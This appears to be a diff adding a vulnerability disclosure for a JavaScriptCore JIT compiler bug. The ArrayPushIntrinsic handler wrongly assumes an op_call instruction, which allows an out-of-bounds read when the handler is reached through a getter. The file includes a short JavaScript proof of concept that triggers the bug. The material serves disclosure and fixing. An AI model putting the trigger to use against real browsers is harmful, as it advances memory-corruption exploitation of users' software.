@@ -1,0 +1,29 @@
+/*
+    case ArrayPushIntrinsic: {
+        ...
+
+        if (static_cast<unsigned>(argumentCountIncludingThis) >= MIN_SPARSE_ARRAY_INDEX)
+            return false;
+
+        ArrayMode arrayMode = getArrayMode(m_currentInstruction[OPCODE_LENGTH(op_call) - 2].u.arrayProfile, Array::Write);
+        
+        ...
+    }
+
+This code always assumes that the current instruction is an op_call instruction. But that code can be reached from op_get_by_id or op_get_by_val instructions using getters. As an op_get_by_val instruction is smaller than an op_call instruction in size, this also can lead to an OOB read.
+
+Note that the handlers for ArraySliceIntrinsic, ArrayIndexOfIntrinsic and ArrayPopIntrinsic have the same pattern.
+
+PoC:
+*/
+
+Array.prototype.__defineGetter__('a', Array.prototype.push);
+
+function opt() {
+    let arr = new Array(1, 2, 3, 4);
+    arr['a' + ''];
+}
+
+for (let i = 0; i < 1000; i++) {
+    opt();
+}
